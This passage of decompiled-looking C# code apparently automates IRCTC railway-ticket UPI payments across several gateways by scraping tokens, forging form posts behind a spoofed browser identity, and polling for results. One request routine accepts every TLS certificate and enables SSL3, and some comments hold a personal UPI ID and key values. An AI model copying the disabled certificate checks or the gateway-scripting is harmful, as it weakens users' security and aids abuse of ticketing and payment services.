            if (!_Request_safex(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            clsMain.Lock("First Output htm = " + string_94);
            if (string_87.Contains("@axisbank"))
            {
                while (true)
                {
                    //if (DateTime.Now > dateTimeee)
                    //{
                    //    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                    //    frmUPI.payStart = true;
                    //    break;
                    //}
                    if (frmUPI.payStart)
                    {
                        Application.DoEvents();
                        Thread.Sleep(100);
                        continue;
                    }
                    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                    frmUPI.payStart = true;
                    break;
                }
            }
            else
            {
                updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
            }
            DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
            while (true)
            {
                Thread.Sleep(500);
                if (DateTime.Now > dateTime2)
                {
                    break;
                }
                string_92 = "https://www.avantgardepayments.com/agcore/sbiUpiStatusCheck/"+text5;
                //text7 = RandomString(16, "ABCDEFGHIJKLMNOPQRSTWXYZ0123456789");
                //text2 = "------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + text5 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefNum\"\r\n\r\n" + string_97 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefHash\"\r\n\r\n" + string_96 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX--\r\n";
                //text2 = text2.Replace("j0AM3cF5ShvILPJX", text7);
                //multipart = "multipart/form-data; boundary=----WebKitFormBoundary" + text7;
                _Request_safex(string_92, null, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0);
                if (string_94.Contains("PENDING"))
                {
                    continue;
                }
                if (string_94.Contains("Transaction Successful"))
                {
                    result = true;
                    if (clsMain.isAPP)
                    {
                        string_90 = GetString_(string_94, "encdata", "\"");
                    }
                    else
                    {
                        string_90 = "encdata=" + GetString_(string_94, "encdata", "\"");
                    }
                    string_91 = string_92;
                }
                break;
            }
            return result;
        }

        internal bool IRCTC_UPI(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text = array[0].Trim();
            string string_92 = "";
            string text2 = "";
            string string_93 = "";
            string string_94 = "";
            string string_95 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            text2 = class3_0.Method_SerialInp(string_86, ref string_92, bool_14: true);
            if (clsMain.isAPP)
            {
                string text3 = string_86.Substring(string_86.IndexOf("encdata") + 18);
                text2 = "encdata=" + text3.Substring(0, text3.IndexOf("\""));
                string_92 = "https://www.irctcipay.com/pgui/jsp/irctcRequestAction";
            }
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            string text4 = string_94.Substring(string_94.IndexOf("customToken") + 20);
            string text5 = text4.Substring(0, text4.IndexOf("\""));
            text4 = string_94.Substring(string_94.IndexOf("innerAmount") + 13);
            string text6 = text4.Substring(0, text4.IndexOf("<"));
            string_92 = "https://www.irctcipay.com/pgui/jsp/upiPay";
            string_93 = "https://www.irctcipay.com/pgui/jsp/surchargePaymentPage.jsp";
            text2 = "------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + text5 + "\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"vpa\"\r\n\r\n" + text + "\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"upiCustName\"\r\n\r\ndummy\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"paymentType\"\r\n\r\nUP\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"mopType\"\r\n\r\nUP\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"amount\"\r\n\r\n" + text6 + "\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"currencyCode\"\r\n\r\n356\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"browserName\"\r\n\r\nChrome\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5\r\nContent-Disposition: form-data; name=\"browserVersion\"\r\n\r\n110\r\n------WebKitFormBoundaryBFAfeEyaUQC9QBB5--\r\n";
            string text7 = RandomString(16, "ABCDEFGHIJKLMNOPQRSTWXYZ0123456789");
            text2 = text2.Replace("BFAfeEyaUQC9QBB5", text7);
            multipart = "multipart/form-data; boundary=----WebKitFormBoundary" + text7;
            if (!_Request_irctc(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            clsMain.Lock("First Output htm = " + string_94);
            string string_96 = GetString_(string_94, "pgRefHash", "\"");
            string string_97 = GetString_(string_94, "pgRefNum", "\"");
            DateTime dateTime = DateTime.Now.AddSeconds(20.0);
            if (string_87.Contains("@axisbank"))
            {
                while (true)
                {
                    if (DateTime.Now > dateTime)
                    {
                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                        frmUPI.payStart = true;
                        break;
                    }
                    if (frmUPI.payStart)
                    {
                        Application.DoEvents();
                        Thread.Sleep(100);
                        continue;
                    }
                    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                    frmUPI.payStart = true;
                    break;
                }
            }
            else
            {
                updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
            }
            DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
            while (true)
            {
                Thread.Sleep(500);
                if (DateTime.Now > dateTime2)
                {
                    break;
                }
                string_92 = "https://www.irctcipay.com/pgui/jsp/verifyUpiResponse";
                text7 = RandomString(16, "ABCDEFGHIJKLMNOPQRSTWXYZ0123456789");
                text2 = "------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + text5 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefNum\"\r\n\r\n" + string_97 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefHash\"\r\n\r\n" + string_96 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX--\r\n";
                text2 = text2.Replace("j0AM3cF5ShvILPJX", text7);
                multipart = "multipart/form-data; boundary=----WebKitFormBoundary" + text7;
                _Request_irctc(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0);
                if (string.IsNullOrEmpty(string_94))
                {
                    continue;
                }
                if (string_94.Contains("Transaction Successful"))
                {
                    result = true;
                    if (clsMain.isAPP)
                    {
                        string_90 = GetString_(string_94, "encdata", "\"");
                    }
                    else
                    {
                        string_90 = "encdata=" + GetString_(string_94, "encdata", "\"");
                    }
                    string_91 = string_92;
                }
                break;
            }
            return result;
        }

        internal bool IRCTC_UPICASHFREE(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text = array[0].Trim();
            string string_92 = "";
            string text2 = "";
            string string_93 = "";
            string string_94 = "";
            string string_95 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            text2 = class3_0.Method_SerialInp(string_86, ref string_92, bool_14: true);
            if (clsMain.isAPP)
            {
                string text3 = string_86.Substring(string_86.IndexOf("encdata") + 18);
                text2 = "encdata=" + text3.Substring(0, text3.IndexOf("\""));
                string_92 = "https://irc.1paypg.in/IRWebMware/PayProcessor";
                string_92 = GetString_(string_86, "bankUrl\",\"value", "\"");
            }
            updateTStatus_1.BeginInvoke(1, "CashfreeUpi STEP 1...", tCntrlName_, null, null);
            bool_14 = true;
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            bool_14 = false;
            string getlink = string_94.Substring(string_94.IndexOf("window.location.replace") + 25);
            getlink = getlink.Substring(0, getlink.IndexOf("')"));
            getlink = getlink.Replace("\\/", "/");
            getlink = getlink.Replace("#" , "");

            string cTOken = "";
            string orderHash = string_94.Substring(string_94.IndexOf("window.location.replace") + 66);
            orderHash = orderHash.Substring(0, orderHash.IndexOf("')"));
            getlink = "https://payments.cashfree.com/pgbillpayuiapi/order/config/"+orderHash;
            if (!_Request(getlink, null, "https://payments.cashfree.com/order/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            //3
            if (!_Request("https://payments.cashfree.com/pgbillpayuiapi/order/tdr/"+orderHash+"?code=7001&type=paymentCode", null, "https://payments.cashfree.com/order/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            text2 = "{\"upiProvider\":\"vpa\",\"upiVpa\":\"" + text + "\",\"orderHash\":\"" + orderHash + "\"}";
            string_92 = "https://payments.cashfree.com/pgbillpayuiapi/upi/create/collect";
            bool_29 = true;
            //text2 = "";
            updateTStatus_1.BeginInvoke(1, "CashfreeUpi STEP 2...", tCntrlName_, null, null);
            if (!_Request(string_92, text2, "https://payments.cashfree.com/order/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            string ttoken = jsonData_Serial(string_94, "txnToken");
            if (!string_94.Contains("Transaction Collect request initiated successfully"))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Invalid Upi Id - Payment Failed";
                return false;
            }
            updateTStatus_1.BeginInvoke(1, "Accept Upi Request", tCntrlName_, null, null);
            string_92 = "https://payments.cashfree.com/pgbillpayuiapi/upi/recon";
            string txxn = string_94.Substring(string_94.IndexOf("transactionId") + 15);
            txxn = txxn.Substring(0, txxn.IndexOf(","));
            //text2 = "{\"orderHash\":\"" + orderHash + "\"\,"transactionId\":\"" + txxn + "\"}";
        text2 = "{\"orderHash\":\"" + orderHash + "\",\"transactionId\":\"" + txxn + "\"}";
        ilrestat:
            if (!_Request(string_92, text2, "https://payments.cashfree.com/order/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            if (string_94.Contains("INCOMPLETE"))
            {
                Thread.Sleep(2000);
                goto ilrestat;
            }
            else if (string_94.Contains("txStatus\":\"SUCCESS"))
            {
                string_92 = "https://payments.cashfree.com/pgbillpayuiapi/gateway/thankyou/process/"+ttoken +"?cfBrowserID=_683bbffda&appVersion=0.0.0";
                text2 = "orderHash="+orderHash+"&transactionId="+txxn;
                bool_14 = true;
                string_93 = string_92;
                if (!_Request(string_92, text2, "https://payments.cashfree.com/order/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_95);
                    string_91 = "Paytm Gateway not working - Payment Failed";
                    return false;
                }
                if (string_94.Contains("Transaction Successful"))
                {
                    text2 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                    bool_14 = true;
                    if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_95);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    if (string_94.Contains("https://www.irctc.co.in/eticketing/mbi/MobileBankResponse"))
                    {
                        class3_0.cashfree = string_94.Substring(string_94.IndexOf("encdata") + 16);
                        class3_0.cashfree = class3_0.cashfree.Substring(0, class3_0.cashfree.IndexOf("'"));
                        
                        result = true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            return result;
        }

        internal bool IRCTC_UPIHDFC(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text = array[0].Trim();
            string string_92 = "";
            string text2 = "";
            string string_93 = "";
            string string_94 = "";
            string string_95 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            text2 = class3_0.Method_SerialInp(string_86, ref string_92, bool_14: true);
            if (clsMain.isAPP)
            {
                string text3 = string_86.Substring(string_86.IndexOf("encdata") + 18);
                text2 = "encdata=" + text3.Substring(0, text3.IndexOf("\""));
                string_92 = "https://irc.1paypg.in/IRWebMware/PayProcessor";
            }
            updateTStatus_1.BeginInvoke(1, "HDFCUPI STEP 1...", tCntrlName_, null, null);
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            string text33 = string_94.Substring(string_94.IndexOf("cToken") + 15);
            string cTOken = text33.Substring(0, text33.IndexOf("\">"));
            text2 = class3_0.Method_SerialInp(string_94, ref string_92, bool_14: true);
            text2 = text2 + HttpUtility.UrlEncode(cTOken);
            updateTStatus_1.BeginInvoke(1, "HDFCUPI STEP 2...", tCntrlName_, null, null);
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }//txnId=1022313920220031627&instrumentId=UPI&cardType=UPI&VPA=stephenrobert32%40ybl&checksum=HRF9fVFFypmoIb1nE8x5Gc5iMliqNeUlCSVyYcoxXCY%3D&MTrackid=1022313920220031627
            //instrumentId=UPI&txnId=1022313920220031627&keyEncKey=0BE0723ERA21EE72B0ACB7A1&cardType=UPI&checksum=HRF9fVFFypmoIb1nE8x5Gc5iMliqNeUlCSVyYcoxXCY%3D&emioption=NA&otherAppValue=true&otherVPA=stephenrobert32%40ybl
            string_93 = string_92;
            clsMain.Lock("First Output htm = " + string_94);
            string hdfcorderid = string_94.Substring(string_94.IndexOf("txnId") + 14);
            hdfcorderid = hdfcorderid.Substring(0, hdfcorderid.IndexOf("\">"));
            hdfcorderid = hdfcorderid.Replace("Id\" value=\"", "");
            string keyEncKey = string_94.Substring(string_94.IndexOf("keyEncKey") + 18);
            keyEncKey = keyEncKey.Substring(0, keyEncKey.IndexOf("\">"));
            string merchref = string_94.Substring(string_94.IndexOf("orderNo") + 11);
            merchref = merchref.Substring(0, merchref.IndexOf("</h4>"));
            merchref = merchref.Replace("\r\n", "").Trim();
            string amouynt = string_94.Substring(string_94.IndexOf("baseAmount1") + 13);
            amouynt = amouynt.Substring(0, amouynt.IndexOf("</div>"));
            amouynt = amouynt.Replace("\r\n", "").Trim();
            text2 = "txnId=" + hdfcorderid + "&instrumentId=UPI&cardType=UPI&VPA=" + HttpUtility.UrlEncode(text) + "&checksum=" + HttpUtility.UrlEncode(cTOken) + "&MTrackid=" + hdfcorderid;
            string_92 = "https://pay.1paypg.in/onepayVAS/UpiCheckServlet";
            updateTStatus_1.BeginInvoke(1, "HDFCUPI STEP 3...", tCntrlName_, null, null);
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0) & !string_94.Contains("sucess"))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }//3
            text2 = "instrumentId=UPI&txnId=" + hdfcorderid + "&keyEncKey=" + keyEncKey + "&cardType=UPI&checksum=" + HttpUtility.UrlEncode(cTOken) + "&emioption=NA&otherAppValue=true&otherVPA=" + HttpUtility.UrlEncode(text);
            ///"instrumentId=UPI&txnId=" + hdfcorderid + "&keyEncKey="+ keyEncKey + "&cardType=UPI&checksum=" + HttpUtility.UrlEncode(cTOken) + "&emioption=NA&otherAppValue=true&otherVPA=" + HttpUtility.UrlEncode(text);
            //"txnId=" + hdfcorderid + "&instrumentId=UPI&cardType=UPI&VPA=" + HttpUtility.UrlEncode(text) + "&checksum=" + HttpUtility.UrlEncode(cTOken) + "&MTrackid=" + hdfcorderid;
            string_92 = "https://pay.1paypg.in/onepayVAS/PGRouter";
            updateTStatus_1.BeginInvoke(1, "HDFCUPI STEP 4...", tCntrlName_, null, null);
            if (!_Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }//4
            if (string_94.Contains("Invalid Request Parameters.Direct Parameter Posting is not allowed"))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "HDFCUPI not working - Payment Failed";
                return false;
            }
            string midhdfc = string_94.Substring(string_94.IndexOf("Mid") + 12);
            midhdfc = midhdfc.Substring(0, midhdfc.IndexOf("\">"));
            text2 = "MTrackid=" + hdfcorderid + "&VPA=" + HttpUtility.UrlEncode(text) + "&merchantRefNo=" + merchref + "&amt=" + amouynt + "&Mid=" + midhdfc;
            string_92 = "https://pay.1paypg.in/onepayVAS/UPIPageIsVAS.jsp";
            if (!_Request(string_92, text2, "https://pay.1paypg.in/onepayVAS/PGRouter", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            string mreff = string_94.Substring(string_94.IndexOf("merchantRefNo") + 17);
            mreff = mreff.Substring(0, mreff.IndexOf("'"));
            //string string_96 = GetString_(string_94, "pgRefHash", "\"");
            //string string_97 = GetString_(string_94, "pgRefNum", "\"");
            DateTime dateTime = DateTime.Now.AddSeconds(20.0);
            if (string_87.Contains("@axisbank"))
            {
                while (true)
                {
                    if (DateTime.Now > dateTime)
                    {
                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                        frmUPI.payStart = true;
                        break;
                    }
                    if (frmUPI.payStart)
                    {
                        Application.DoEvents();
                        Thread.Sleep(100);
                        continue;
                    }
                    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                    frmUPI.payStart = true;
                    break;
                }
            }
            else
            {
                updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
            }
            DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
            int nummm = 0;
            while (true)
            {
                nummm++;
                Thread.Sleep(2000);
                if (DateTime.Now > dateTime2)
                {
                    break;
                }
                if (nummm == 30)
                {
                    break;
                }
                string_92 = "https://pay.1paypg.in/onepayVAS/ajaxAction?type=getStatusUPITransaction";
                text2 = "mTrackId=" + hdfcorderid + "&merchantRefNo=" + mreff + "&amount=" + amouynt + "&val_i=" + nummm;
                //text7 = RandomString(16, "ABCDEFGHIJKLMNOPQRSTWXYZ0123456789");
                //text2 = "------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + text5 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefNum\"\r\n\r\n" + string_97 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX\r\nContent-Disposition: form-data; name=\"pgRefHash\"\r\n\r\n" + string_96 + "\r\n------WebKitFormBoundaryj0AM3cF5ShvILPJX--\r\n";
                //text2 = text2.Replace("j0AM3cF5ShvILPJX", text7);
                //multipart = "multipart/form-data; boundary=----WebKitFormBoundary" + text7;
                _Request(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0);
                if (!string_94.Contains("encRespXML"))
                {
                    continue;
                }
                if (string_94.Contains("encRespXML"))
                {
                    updateTStatus_1.BeginInvoke(1, "Payment SUcessfull...", tCntrlName_, null, null);
                    //response = File.ReadAllText(pathhh);
                    string encRespXML = jsonData_Serial(string_94, "encRespXML");
                    encRespXML = encRespXML.Replace("\\/", "/");
                    string pgid = jsonData_Serial(string_94, "pgid");
                    string merchantId = jsonData_Serial(string_94, "merchantId");
                    string urlll = jsonData_Serial(string_94, "url");
                    urlll = urlll.Replace("\\/", "/");
                    //result = true;
                    text2 = "respData=" + HttpUtility.UrlEncode(encRespXML) + "&merchantId=" + merchantId + "&pgid=" + pgid;
                    _Request(urlll, text2, null, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0);
                    if (string_94.Contains("https://www.irctc.co.in/eticketing/mbi/MobileBankResponse"))
                    {

                        class3_0.hdfcupi = class3_0.Method_SerialInp(string_94, ref string_92, bool_14: true);
                        class3_0.hdfcupi = class3_0.hdfcupi.Replace("encdata=", "");
                        result = true;
                    }
                    else
                    {
                        return false;
                    }


                }
                break;
            }
            return result;
        }

        static string DecodeEncodedNonAsciiCharacters(string value)
        {
            return Regex.Replace(
                   value,
                   @"\\u(?<Value>[a-zA-Z0-9]{4})",
                   m =>
                   {
                       return ((char)int.Parse(m.Groups["Value"].Value, NumberStyles.HexNumber)).ToString();
                   });
        }

        internal bool _Request_safex(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text = "";
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy httpRequestCachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    httpWebRequest.Timeout = int_28;
                    httpWebRequest.ReadWriteTimeout = int_29;
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    if (cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
                    httpWebRequest.ContentType = "application/json";
                    httpWebRequest.Accept = "*/*";
                    httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                    httpWebRequest.AllowWriteStreamBuffering = true;
                    httpWebRequest.AllowAutoRedirect = true;
                    if (!string.IsNullOrEmpty(string_87))
                    {
                        httpWebRequest.Method = "POST";
                        byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                        httpWebRequest.ContentLength = bytes.Length;
                        httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if ((httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag2 = ex.Response != null;
                    string text2 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag2)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text2 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text2 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                    continue;
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool _Request_irctc(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
